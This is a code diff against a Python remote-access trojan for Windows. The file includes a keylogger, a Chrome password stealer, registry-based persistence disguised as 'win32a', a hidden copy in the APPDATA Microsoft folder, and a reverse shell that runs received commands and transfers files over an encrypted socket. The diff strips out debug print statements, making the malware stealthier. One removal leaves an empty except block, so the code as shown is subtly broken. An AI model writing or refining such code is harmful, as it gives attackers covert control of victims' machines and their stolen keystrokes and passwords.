@@ -38,7 +38,6 @@ keylogger_thread = None
 def copy_to_hidden_location():
     # Chemin du dossier de destination
     dest_folder = os.path.join(os.environ['APPDATA'], 'Microsoft')
-    print(dest_folder)
     if not os.path.exists(dest_folder):
         os.makedirs(dest_folder)
     
@@ -76,9 +75,7 @@ def add_to_registry(executable_path):
                               winreg.KEY_WRITE)
         winreg.SetValueEx(key, "win32a", 0, winreg.REG_SZ, executable_path)
         winreg.CloseKey(key)
-        print("Ajouté au registre avec succès.")
     except Exception as e:
-        print(f"Erreur lors de l'ajout au registre : {e}")
 
 
 
@@ -142,8 +139,6 @@ def execcommande(commande):
         send_file(file_path.strip())
     elif commande.startswith("Upload"):
         _, file_path = commande.split(" ", 1)
-        print(file_path)
-        print(file_path.strip())
         receive_file(file_path.strip())
     elif commande[0:2] != "cd":
         result = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -171,7 +166,6 @@ def reverse_shell():
             if data != "":
                 execcommande(data)
         except Exception as e:
-            print(f"Error: {e}")
             break
 
     sock.close()
@@ -181,7 +175,6 @@ def keylog():
     while keylogger_running:
         keys = keyboard.record(until='ENTER')
         typed_strings = typed_strings + ''.join(keyboard.get_typed_strings(keys))
-        print(typed_strings)
 
 def get_chrome_pass():
     try:
@@ -228,7 +221,6 @@ def send_file(file_path):
         with open(file_path, 'rb') as file:
             while (chunk := file.read(4096)):
                 time.sleep(0.2)
-                print(chunk.decode('utf-8'))
                 sock.sendall(encrypt(tkey, chunk.decode('utf-8')).encode('latin-1'))
             sock.sendall(encrypt(tkey, "END").encode('latin-1'))
     else:
@@ -237,16 +229,12 @@ def send_file(file_path):
     sock.sendall(encrypt(tkey, f"finished to Download the file \n{os.getcwd()}>").encode('latin-1'))
 def receive_file(filename):
     data = sock.recv(4096).decode('latin-1')
-    print(decrypt(tkey, data))
     filecontent = ""
     while decrypt(tkey, data) != "END":
         filecontent += decrypt(tkey, data)
         data = sock.recv(4096).decode('latin-1')
-        print(filecontent)
-    print(filecontent)
     with open(filename, 'w') as fichier:
         fichier.write(filecontent)
-    print("finished to have the file")
     sock.sendall(encrypt(tkey, f"finished to Upload the file \n{os.getcwd()}>").encode('latin-1'))
 
 
